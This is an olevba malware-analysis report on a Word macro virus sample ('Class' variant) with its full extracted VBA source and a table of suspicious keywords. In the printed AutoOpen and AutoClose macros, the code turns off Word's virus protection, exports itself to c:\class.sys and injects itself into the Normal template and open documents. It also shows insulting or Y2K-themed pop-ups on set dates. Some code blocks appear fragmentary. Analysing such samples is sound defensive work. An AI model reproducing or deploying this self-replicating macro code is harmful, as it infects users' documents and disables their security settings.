olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-da3df9c27801cc9ba5337df16a23bfdb321eb20a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-da3df9c27801cc9ba5337df16a23bfdb321eb20a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' Open Letter to the Virus Hunters
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' This virus was written to help educate the
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' millennium bug. Please do not update your
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' until after December 1, 1999.
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' I know you won't do that, but what the heck.
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' I tried.
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' Bye!
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
On Error Resume Next
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
s = ActiveDocument.Saved
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Application.EnableCancelKey = Not -1
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Randomize
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If Dir("c:\sys00.bak", 6) = "" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
      Print #1, a
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Close #1
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
End If
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Else
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
End If
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If tf <> "" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   If LOF(1) = 0 Then GoTo q
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Do While Not EOF(1)
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
      tf.CodeModule.InsertLines i, a
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Loop
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Close #1
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer

'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
hh = Hour(Now): mm = Minute(Now): ss = Second(Now)
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' only display messages for 1999
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   GoTo end_here
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer

'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If hh > 12 Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Sub ToolsMacro()
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
t$ = Chr(13) + Chr(13)

'april 1, 1999
If dd = 1 And mm = 4 Then
   Title$ = "Y2K! Spread the word"
   msg$ = "This is not an April fools joke. I wish it were! The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000."
   msg$ = msg$ + t$ + "From today until January 1, 2000, on the first business day of each month, I will give you a lesson in Y2K preparation."
   msg$ = msg$ + t$ + "Spread the word. Knowledge is power!"
   MsgBox msg$, vbCritical, Title$
End If

'May 3, 1999
If dd = 3 And mm = 5 Then
   Title$ = "Hello again!"
   msg$ = "Lets start our first lesson to help prepare you for the millennium bug. Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st)."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'June 1, 1999
If dd = 1 And mm = 6 Then
   Title$ = "How's the weather?"
   msg$ = "Right now it's pretty warm out, so you are probably not thinking much about the winter. But remember the millennium bug is expected to hit in the middle of winter. If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'July 2, 1999
If dd = 2 And mm = 7 Then
   Title$ = "Did you get the stove?"
   msg$ = "Last month I recommend purchasing a gas stove to help heat your home in the event that your supply of electricity, gas, or oil was interrupted. This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'August 2, 1999
If dd = 2 And mm = 8 Then
   Title$ = "Getting back to basics"
   msg$ = "In this installment, I would like to suggest that you consider purchasing candles, matches, flashlights, and batteries. These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'September 1, 1999
If dd = 1 And mm = 9 Then
   Title$ = "A Limerick"
   msg$ = "The millennium 's not far away"
   msg$ = msg$ + Chr(13) + "Get onto your coding today"
   msg$ = msg$ + Chr(13) + "Fix it or fudge it"
   msg$ = msg$ + Chr(13) + "The boss won't begrudge it"
   msg$ = msg$ + Chr(13) + "If everything works on the day!"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'October 1, 1999
If dd = 1 And mm = 10 Then
   Title$ = "Three months to go"
   msg$ = "Getting nervous? If you've followed my advice over the past months, there should be nothing for you to worry about. We will survive the Y2K bug, but preparation will insure that if there is any Y2K crisis, it will only be small bump on the road, not a major pothole for you."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'November 1, 1999
If dd = 1 And mm = 11 Then
   Title$ = "Two months to go"
   msg$ = "Personally, I don't believe that there will be a major, global Y2K crisis. I trust the banks with my money, I trust MOST of the industrial sector, and I trust the power and water agencies to provide me with power and water over the ""infamous"" weekend. I even trust the Russians and there nuclear arms! BUT you can never be too careful. Take care. Be prepared. Use common sense."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'December 1, 1999
If dd = 1 And mm = 12 Then
   Title$ = "Good Luck (30 days to go)"
   msg$ = "Well, this will be the final installment in the Y2K preparation lessons. If you have followed my advice over the past few months, you will be in excellent shape to bring in the New Year. May the New Year bring you health and happiness. Best wishes."
   msg$ = msg$ + t$ + "Bye!"
   MsgBox msg$, vbCritical, Title$
End If

end_here:

End Sub
Sub AutoOpen()
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
On Error GoTo out
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Options.VirusProtection = False
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Options.SaveNormalPrompt = False
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Options.ConfirmConversions = False
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt > 70 And ad > 0 Then GoTo out
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt < 70 Then
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End If
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
host.CodeModule.AddFromFile ("c:\class.sys")
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
With host.CodeModule
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    For x = 1 To 4
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .deletelines 1
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    Next x
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End With
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt < 70 Then
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    With host.CodeModule
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .replaceline 1, "Sub AutoClose()"
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .replaceline 71, "Sub ToolsMacro()"
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    End With
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End If
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
With host.CodeModule
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    For x = 2 To 72 Step 2
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    Next x
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End With
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
out:
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End Sub
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Sub ViewVBCode()
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
